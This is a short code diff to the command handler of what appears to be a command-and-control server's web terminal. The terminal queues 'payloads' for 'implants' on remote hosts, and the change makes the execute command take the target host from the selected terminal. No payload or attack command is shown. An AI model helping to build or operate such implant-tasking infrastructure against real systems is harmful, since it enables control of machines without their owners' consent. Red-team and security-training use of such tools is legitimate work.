@@ -8,8 +8,7 @@ async function getCommandHistory(username) {
 
 module.exports.processCommand = async (req, res) => {
     try {
-        let { command, username } = req.body;
-
+        let { command, username, currentTerminalId } = req.body;
         // Add command to user's command history
         User.updateOne(
             { username: username },
@@ -33,12 +32,12 @@ module.exports.processCommand = async (req, res) => {
 Available Commands: 
 help - Display this message.
 clear - Clear the terminal.
-execute <payload> <host id> - Add a payload to an impant's queue.`,
+execute <payload> - Add a payload to an impant's queue.`,
             type: "info",
             history: await getCommandHistory(username)});
         } else if (command.includes("execute")) {
             const payload = command[1];
-            const hostId = command[2];
+            const hostId = currentTerminalId
             if (payload && hostId) {
                 res.json({
                     message: `Adding payload to queue for host: ${hostId}`,
@@ -49,7 +48,7 @@ execute <payload> <host id> - Add a payload to an impant's queue.`,
                 
             } else {
                 res.json({
-                    message: "Incorrect usage of execute command. Usage: execute <payload> <host id>",
+                    message: "Incorrect usage of execute command. Usage: execute <payload>",
                     type: "error",
                     history: await getCommandHistory(username)
                 });
